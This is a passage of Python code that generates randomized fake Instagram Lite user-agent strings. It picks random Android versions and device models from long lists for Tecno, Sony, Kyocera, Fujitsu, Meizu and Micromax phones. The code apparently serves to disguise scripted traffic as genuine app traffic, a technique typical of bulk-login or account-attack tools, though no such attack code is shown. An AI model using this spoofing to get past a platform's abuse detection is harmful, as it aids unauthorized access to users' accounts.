'TECNO AX8', 'TECNO AX8S', 'en TECNO AX8', 'Tecno phantom 8', 'TECNO AB7', 'TECNO AC8', 'TECNO AD8', 'TECNO AD9', 'TECNO PhonePad 3', 'TECNO F3', 'TECNO SC7S', 'TECNO SA2S', 'TECNO BA2', 'TECNO B1p', 'ar_AE TECNO B1p', 'TECNO B1f', 'TECNO B1c', 'TECNO B1g', 'ar_AE TECNO B1g', 'TECNO KB2h', 'TECNO RA8', 'TECNO KB2j', 'TECNO RB7S', 'TECNO RB6S', 'TECNO RB8S', 'TECNO BB2', 'ar_AE TECNO BB2', 'TECNO BB4', 'ar_AE TECNO BB4', 'TECNO BC2c', 'af TECNO BC2', 'ar_EG TECNO BC2c', 'TECNO BC1', 'TECNO BC1s', 'TECNO BC3', 'TECNO BD2d', 'TECNO BD2', 'TECNO BD2p', 'TECNO BD1', 'TECNO BD4', 'MZ-TECNO BD4', 'TECNO BD4a', 'TECNO BD4h', 'TECNO BD4j', 'TECNO W5006S', 'TECNO BD3', 'TECNO L6502S', 'TECNO BE7', 'TECNO BF6', 'TECNO BE6', 'TECNO BE6j', 'TECNO BE8', 'TECNO BF7', 'TECNO LA6', 'TECNO LA7', 'TECNO LA7 Pro', 'TECNO LB7', 'TECNO LC6', 'ar_AE TECNO LC6', 'TECNO LC6a', 'TECNO LB8a', 'TECNO LB8', 'TECNO LC7', 'TECNO LC7S', 'TECNO LC8', 'TECNO LD7', 'MZ-TECNO LD7j', 'TECNO LE7', 'TECNO LE7n', 'TECNO LF7n', 'TECNO LF7', 'TECNO LG7n', 'TECNO LG8n', 'TECNO LE8', 'TECNO LE6', 'TECNO LE6h', 'TECNO LE6j', 'TECNO LG6n', 'TECNO Q1', 'TECNO R6', 'TECNO R6S', 'TECNO R7', 'TECNO RA7', 'TECNO RC6', 'ar_AE TECNO R8O', 'TECNO R8S', 'TECNO RA6', 'fr_FR TECNO RA6', 'TECNO RA6S', 'TECNO S1', 'TECNO S1 Pro', 'TECNO S3', 'TECNO S3C', 'TECNO S6', 'TECNO S6S', 'TECNO S7', 'TECNO S9', 'TECNO SA1', 'TECNO SA1S Pro', 'TECNO SA3', 'TECNO SA6', 'TECNO SA6S', 'TECNO SA7S', 'TECNO K7', 'TECNO KI5q', 'TECNO KI8', 'TECNO KI7', 'TECNO KI5k', 'TECNO KA7', 'ar_AE TECNO KA7', 'TECNO KA7O', 'ar_EG TECNO KA7', 'TECNO LB6', 'TECNO KB7j', 'TECNO KB8', 'TECNO KC8', 'TECNO KC2', 'TECNO KC2j', 'TECNO KC8S', 'TECNO KC6', 'TECNO KC6 Flow', 'TECNO KC1j', 'TECNO KC6S', 'TECNO BB4k', 'TECNO KD7h', 'TECNO KD7S', 'TECNO KD6', 'ar_AE TECNO KD6', 'ar TECNO KD6', 'TECNO KD6a', 'TECNO KD7', 'TECNO KD7 Flow', 'TECNO KE7', 'TECNO KE6j', 'TECNO KE5', 'TECNO KE5k', 'TECNO KF6i', 'TECNO KF6j', 'TECNO PR651E', 'TECNO PR651H', 'ar_AE TECNO KF6', 'TECNO KF8', 'TECNO KF7j', 'TECNO KF6p', 'TECNO KG6', 'TECNO KG6k', 'TECNO Mobile KG6k', 'TECNO Mobile KG8', 'TECNO KG8', 'TECNO KG5k', 'TECNO KG5j', 'MZ-TECNO KG5k', 'TECNO KG7h', 'TECNO KG6p', 'TECNO Mobile KG6p', 'TECNO KG5p', 'TECNO KH7n', 'TECNO KH7', 'TECNO KH7h', 'TECNO KH6', 'TECNO KC1', 'TECNO KA9', 'TECNO KC1h', 'TECNO KE5S', 'TECNO KG5m', 'TECNO KG5h', 'TECNO BF7n', 'TECNO K9', 'TECNO K8', 'TECNO KA6', 'Tecno T01', 'Tecno T228', 'Tecno T28', 'Tecno T388', 'Tecno T8', 'Tecno T808', 'Tecno T819', 'Tecno T8722', 'Tecno T9', 'Tecno V86', 'TECNO W1', 'TECNO W2', 'TECNO-W3LTE', 'TECNO-W3', 'TECNO W3 Pro', 'TECNO W4', 'TECNO_W4', 'TECNO-W5', 'TECNO W5 Lite', 'TECNO WX3', 'TECNO WX3LTE', 'TECNO WX3P', 'TECNO WX3F LTE', 'TECNO WX4', 'TECNO_WX4', 'TECNO WX4 Pro', 'Tecno X520', 'TECNO-Y2', 'TECNO-Y3+', 'TECNO-Y4', 'TECNO-Y5S', 'TECNO-Y6', 'Tecno Z5'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; TECNO MOBILE LIMITED/TECNO; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Sony':
                    self.android_version = random.choice(['10', '11', '13'])
                    self.device_model = random.choice(['BRAVIA 2015', 'BRAVIA 2K GB ATV3', 'BRAVIA 4K 2015', 'BRAVIA 4K GB', 'BRAVIA 4K GB ATV3', 'BRAVIA 4K UR2', 'BRAVIA 4K UR3', 'BRAVIA 4K VH2', 'BRAVIA VH1', 'BRAVIA VU1', 'Sony Experia 10', 'H4433', 'SONY-M880', 'SGP412', 'SGP551', 'SmartWatch 3', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'NW-A100Series', 'NW-Z1000Series', 'Sony Xperia', 'J9110', '802SO', 'SOV40', 'SO-51A', 'SOG01', 'XQ-AT51', 'XQ-AT42', 'SO51Aa', 'SO-51B', 'XQ-BC52', 'SOG03', 'XQ-BC72', 'XQ-CT72', 'XQ-CT54', 'SOG06', 'I4113', 'I3113', 'I4193', 'SO-41A', 'SOV43', 'A001SO', 'XQ-AU52', 'XQ-AT52', 'XQ-BT52', 'SOG04', 'A102SO', 'SO-52B', 'XQ-BT44', 'XQ-CC54', 'XQ-CC72', 'SO-52C', 'A202SO', 'I4293', 'I4213', 'SOV41', '901SO', 'SO-01M', 'J8210', 'J9210', 'SO-52A', 'SOG02', 'XQ-AS52', 'A002SO', 'XQ-AS72', 'XQ-BQ52', 'SO-53B', 'SOG05', 'XQ-BQ72', 'A103SO', 'XQ-CQ54', 'XQ-CQ72', 'SOV42', '902SO', 'J3273', 'SO-04E', 'SonySO-04E', 'Xperia A', 'SO-04F', 'SAMSUNG Xperia a369i', 'SO-04G', 'SO-04G', 'J3173', 'SO-41B', 'SOG08', 'SO-53C', 'A203SO', 'Xperia Active', 'Xperia Active', 'Xperia Active', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'LT26w', 'LT26w', 'SO-01E', 'Sony Xperia B6376', 'XPERIA BEAST 3', 'Xperia Burst', 'S39h', 'C2304', 'C2305', 'C2304', 'C2305', 'D2533', 'D2502', 'E5306', 'E5303', 'E5303', 'E5353', 'E5333', 'E5363', 'E5333', 'Xperia C5', 'E5553', 'E5506', 'E5533', 'E5563', 'XPERIA CUSTOM XA8', 'C1505', 'C1505', 'C1504', 'SonyC1504', 'SonyC1505v', 'SonyC1505', 'SonyC1504', 'SonyC1505', 'SonyC1504', 'C1505', 'C1505', 'SonyC1505', 'SonyC1505', 'SonyC1505', 'C1604', 'SonyC1605', 'SonyC1604', 'C1605', 'C1605', 'SonyC1605', 'C1604', 'SonyC1605', 'D2005', 'D2004', 'SonyD2005', 'D2005', 'D2104', 'D2114', 'D2105', 'D2105', 'XPERIA E16i', 'D2203', 'D2202', 'D2243', 'D2206', 'Xperia E3 3G', 'E3 Dual', 'D2212', 'D2212', 'D2212', 'E2115', 'E2104', 'E2105', 'xperia e4 dual', 'E2003', 'E2053', 'E2006', 'E2043', 'E2033', 'E2033', 'F3311', 'F3313', 'Xperia F_v3 Ultra', 'SONY XPERIA G', 'SonyST27a', 'SonyST27i', 'ST27a', 'ST27i', 'ST27I', 'ru ST27i', 'SonyST27i', 'SonyEricssonST27i', 'ST27i', 'ST27i', 'SO-04D', 'SonySO-04D', 'Xperia H870', 'SonyLT28i', 'SonyLT28h', 'LT28h', 'SonyEricssonLT28at', 'SonyEricssonLT28h', 'LT28i', 'LT28h', 'SonyLT28h', 'Xperia ion', 'Xperia ion', 'SonyEricssonLT28i', 'SonyEricssonLT28i', 'SonyEricssonLT28h', 'SonyEricssonLT28i', 'SonyST26a', 'ST26a', 'SonyST26i-o', 'SonyST26i', 'ST26i', 'ST26i', 'Xperia J', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'ST26i', 'C2105', 'C2105', 'C2105', 'C2105', 'C2105', 'G3311', 'G3311', 'G3313', 'G3312', 'ru G3312', 'H3311', 'H3321', 'H4311', 'I3312', 'I4312', 'XQ-AD52', 'C1905', 'C1904', 'C1905', 'SonyC1904', 'SonyC1905', 'C1905', 'C1905', 'C2004', 'C2005', 'D2303', 'D2306', 'D2303', 'Xperia M2 3G', 'D2406', 'D2403', 'D2302', 'XPERIA M2 HSPASS', 'E2303', 'E2333', 'E2306', 'E2363', 'E2312', 'E2312', 'E5603', 'E5606', 'E5653', 'E5633', 'E5663', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia mini pro', 'ST23i', 'SonyST23iv', 'SonyST23a', 'ST23i', 'SonyST23i', 'ST23i', 'ST23i', 'ST23i', 'SonyST23i', 'SonyST23i', 'SonyST23i', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo L', 'Xperia Neo V', 'Xperia Neo V', 'Sony Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'SO-02D', 'Xperia P', 'SonyLT22i', 'LT22i', 'SonyEricssonLT22i', 'SonyEricssonLT22i-o', 'LT22i', 'LT22i', 'LT22i', 'SonyEricssonLT22i-o', 'SonyLT22i', 'XQ-AQ52', 'XQ-AQ62', 'XQ-BE52', 'XQ-BE62', 'XQ-BE72', 'G2299', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Sony Xperia RC', 'Sony Xperia RC', 'SonyLT26iv', 'LT26i', 'SonyEricssonLT26i-o', 'SonyEricssonLT26i', 'LT26i', 'Xperia S', 'LT26i', 'SonyEricssonLT26i', 'Xperia S', 'Xperia S', 'Xperia S', 'SonyLT26i', 'LT26ii', 'ru LT26ii', 'LT26ii', 'LT26ii', 'Xperia Sola', 'Xperia Sola', 'C5303', 'C5302', 'C5306', 'SonyC5303', 'SonyC5306', 'C5303', 'Xperia SP', 'SO-05D', 'LT30p', 'SonyLT30p-o', 'LT30p', 'SonyLT30p', 'LT30p', 'LT30a', 'SonyLT30a', 'D5303', 'D5306', 'D5316', 'XM50h', 'XM50t', 'D5303', 'D5322', 'Xperia T3', 'D5103', 'D5102', 'D5106', 'D5103', 'Xperia Tab', 'SGPT12', 'Xperia Tablet S', 'SGPT13', 'SGPT13', 'SGPT12', 'SGP311', 'SGP321', 'SGP312', 'SGP512', 'SGP511', 'SGP521', 'SGP621', 'SGP611', 'SGP712', 'SonyST21i', 'SonyST21i', 'SonyST21i-o', 'ST21i', 'ST21a', 'ST21i', 'SonyST21a', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21a', 'SonyST21i', 'SonyST21a', 'ST21i2', 'SonyST21a2', 'SonyST21i2', 'SonyST21i2', 'SonyST21i2', 'ru ST21i2', 'SonyST21i2', 'ST21i2', 'LT29i', 'Xperia TX', 'SonyST25i', 'ST25a', 'ST25i', 'ST25a', 'SonyEricssonST25i', 'ST25i', 'ru ST25i', 'ST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SOL22', 'SOL22', 'SonySOL22', 'Xperia UL', 'Xperia V', 'SonyLT25i', 'Sony Xperia V', 'SonyLT25i', 'SonySOL21', 'F5121', 'F5321', 'SO-02J', 'F5122', '502SO', 'F8131', 'SO-04H', 'SOV33', 'F8132', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia x10 Mini Pro', 'Xperia X42', 'Xperia X8', 'XPERIA X8', 'Xperia X8', 'XPERIA X8', 'XPERIA X8', 'Xperia X8', 'Xperia X8', 'Xperia X8', 'XPERIA X8', 'F3111', 'F3115', 'Xperia XA 4', 'F3112', 'F3116', 'F3211', 'F3215', 'F3216', 'F3212', 'G3112', 'G3116', 'G3121', 'G3416', 'G3412', 'G3421', 'G3426', 'G3426', 'G3221', 'G3223', 'G3226', 'G3212', 'Xperia XA1 Unlocked', 'H3113', 'H4113', 'H4133', 'H4413', 'H4493', 'H3413', 'Xperia XA2 Plus Dual (AOSP)', 'H4213', 'H3213', 'H3223', 'H4233', 'Xperia XR', 'Xperia XR', '601SO', 'F8331', 'F8332', 'SO-01J', 'G8142', 'G8141', 'SO-04J', 'SO-04K', 'Xperia XZ Premium Dual (AOSP)', 'SO-01K', 'G8341', 'G8342', 'G8343', 'Xperia XZ1 (AOSPA)', 'G8441', 'SO-02K', 'Xperia XZ1 Dual', 'Xperia XZ1 Dual (AOSP)', 'SO-03K', 'H8324', 'SOV37', '702SO', 'H8216', 'SOV37', 'SO-05K', 'SO-05K', 'H8266', 'SOV38', 'H8116', 'H8166', 'H8416', '801SO', 'SO-01L', 'H9436', 'H9493', 'Xperia XZ3 Dual (AOSP)', 'Xperia XZ4', '602SO', 'G8231', 'G8232', 'SOV35', 'SOV35', 'C6603', 'C6602', 'C6833', 'C6802', 'SonySOL24', 'C6903', 'C6902', 'SO-02F', 'C6943', 'D5503', 'Xperia Z1s', 'Xperia Z1s', 'xperia z1s', 'D6503', 'D6503', 'D6503', 'SO-03F', 'SGP561', 'SOT21', 'Xperia Z2 Tablet WiFi', 'D6563', 'xperia z2a', 'D6653', 'D6603', 'SO-01G', 'SOL26', 'D6643', 'D5803', 'SO-02G', 'D5833', 'D6633', 'D6633', 'E6533', 'E6553', 'E6533', 'Xperia Z3C', 'Xperia z3Dual', 'Xperia z3tc', 'D6708', 'SOV31', 'SGP771', 'SO-03G', '402SO', 'Xperia Z4 Tablet', 'Xperia Z4 Tablet Wifi', 'Xperia Z4 Xtreme', 'xperia z4v', 'moto e22', '501SO', 'E6653', 'SO-01H', 'E6603', 'SO-02H', 'E5823', 'E5803', 'E5823', 'E6633', 'E6683', 'E6853', 'SO-03H', 'E6883', 'E6833', 'Xperia Z5P', 'Xperia Z7', 'C6502', 'C6506', 'C6503', 'SonyC6506', 'C6503', 'SOL25', 'Xperia ZQ', 'C5503', 'C5502'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Sony/docomo; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Kyocera':
                    self.android_version = random.choice(['10', '12', '9'])
                    self.device_model = random.choice(['A101BM', 'KYV32', 'KYV43', 'KYV43_j', 'KYV47', 'KYV47-u', 'KYV47-j', 'E6782', 'KYOCERA-C6742', 'KYOCERA-C6742A', 'KYOCERA-C6745', 'NP501KC', '901KC', 'A101KC', '404KC', 'WX10K', '503KC', '602KC', '704KC', 'KYV36', 'KYL21', '302KC', 'E6560C', 'E6560T', 'C6930', 'KYOCERA-E6820', 'E6810', 'KYOCERA-E6920', 'E6910', 'E7110', 'E6790TM', 'KYOCERA-E6790', 'E6782L', 'KYOCERA-E4710', 'KYOCERA-E4830', 'KYOCERA-E6560', 'KYF32', 'KYF41', 'KYF39', 'KYF37', 'KYF31', 'KYF42', 'KYV48', 'C5170', 'C5215', 'C6750', 'C6730', 'C6530N', 'C6743', 'C6740N', 'C6522N', 'KYV33', 'KYX31', '705KC', 'A001KC', 'A201KC', 'KYF38', 'KCP01K', 'KYF40', 'KYF35', 'C5120', 'KYL23', 'KYV39', 'S4-KC', 'S6-KC', 'S8-KC', 'S9-KC', 'X3-KC', 'KYV37', 'KYV42', 'KYV42_u', 'KYV44', 'KYV44_u', 'KYV44_u2', 'KYT31', 'KYT33', 'KYT32', 'KYV40', 'KYV40U', 'C5155', 'KC-S701', 'KYG01', 'KYY24', 'KYV35', 'KYV41', 'KYV46', 'KYF33', 'KYY21', 'KYY22', 'KYY23', 'URBANO PROGRESSO', 'KYV31', 'KYV34', 'KYV45'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; KYOCERA; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Fujitsu':
                    self.android_version = random.choice(['10', '12', '9', '11'])
                    self.device_model = random.choice(['F-03H', 'M532', 'FJL22', 'FCG01', 'F-51B', 'A101FC', '801FJ', 'arrowsRX', 'arrowsM05', 'arrowsM04 PREMIUM', 'arrowsM03', '901FJ', 'FJL21'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; FUJITSU/DOCOMO; {}; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model.replace(' ', '-'), self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model.replace(' ', '-'), self.device_model.replace('-', '')))
                elif self.jenis == 'Meizu':
                    self.android_version = random.choice(['10', '12', '9'])
                    self.device_model = random.choice(['15 Lite', 'MZ-15 Lite', '15 Plus', 'MZ-15 Plus', 'arm_64 15 Plus', '16', 'MZ-16s', '16s Pro', 'MZ-16s Pro', 'MZ-16T', '16T', 'vi 16T', 'MZ-16th', '16th Plus', 'MZ-16th Plus', 'MZ-16 X', 'meizu 16Xs', 'meizu 17', 'MZ-meizu 17', 'meizu 17 Pro', 'MZ-meizu 17 Pro', 'MZ-MEIZU 18', 'MEIZU 18 Pro', 'MZ-MEIZU 18 Pro', 'MZ-MEIZU 18s', 'MEIZU 18s Pro', 'MEIZU 18X', 'MZ-MEIZU 18X', 'MZ-MEIZU 20', 'Meizu 6T', 'MZ-Meizu 6T', 'Meizu C19', 'meizu C9', 'meizu C9 pro', 'arm_64 meizu C9 pro', 'MZ-MEIZU E3', 'MEIZU E3', 'MZ-M A5', 'm1 metal', 'MZ-m1 metal', 'm1 note', 'MZ-m1 note', 'meizu M10', 'MZ-meizu M10', 'MZ-M15', 'M1 E', 'MZ-M1 E', 'MZ-M578C', 'm2', 'MZ-m2', 'M571C', 'MZ-M571C', 'm2 note', 'MZ-m2 note', 'MZ-M2 E', 'M2 E', 'MZ-m3', 'MZ-M3', 'M3 Max', 'MZ-M3 Max', 'm3 note', 'M3 note', 'MZ-m3 note', 'MZ-M3_s', 'M3E', 'MZ-M3E', 'MZ-M3s', 'M3X', 'MZ-M5', 'MEIZU_M5', 'MZ-MEIZU_M5', 'MZ-M5 Note', 'MZ-M621C', 'MZ-M57AC', 'M5c', 'MZ-M5c', 'M5s', 'MZ-M5s', 'MZ-MEIZU M6', 'MEIZU M6 Java', 'MZ-M6 chen', 'MZ-M6 Note', 'MZ-M611D', 'MZ-M685U', 'MZ-Meizu M6s', 'M6T', 'MZ-M6T', 'MZ-M1813', 'meizu M8', 'meizu M8 lite', 'M1816', 'MZ-meizu M8 lite', 'Meizu M8c', 'Meizu M8c Pro', 'M031', 'MX2', 'M040', 'M045', 'M353', 'M355', 'M356', 'M351', 'MX4', 'MZ-MX4', 'MX4 Pro', 'MZ-MX4 Pro', 'MX5', 'MZ-MX5', 'MX6', 'MZ-MX6', 'M1822', 'MZ-M1822', 'MZ-meizu note8', 'MZ-Note9', 'MZ-meizu note9', 'MZ-MEIZU note3', 'PRO 5', 'MZ-PRO 5', 'PRO 6', 'MZ-PRO 6s', 'PRO 6 Plus', 'MZ-PRO 6 Plus', 'MZ-PRO 7', 'MZ-PRO 7-H', 'PRO 7-S', 'PRO 7 Plus', 'arm_64 PRO 7 Plus', 'MZ-PRO 7 Plus', 'Meizu S6', 'MZ-TYH212U', 'MZ-U10', 'MZ-U20', 'MZ-meizu X8', 'MZ-Y685Q'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Meizu; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Micromax':
                    self.android_version = random.choice(['10', '9', '12', '11'])
                    self.device_model = random.choice(['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax 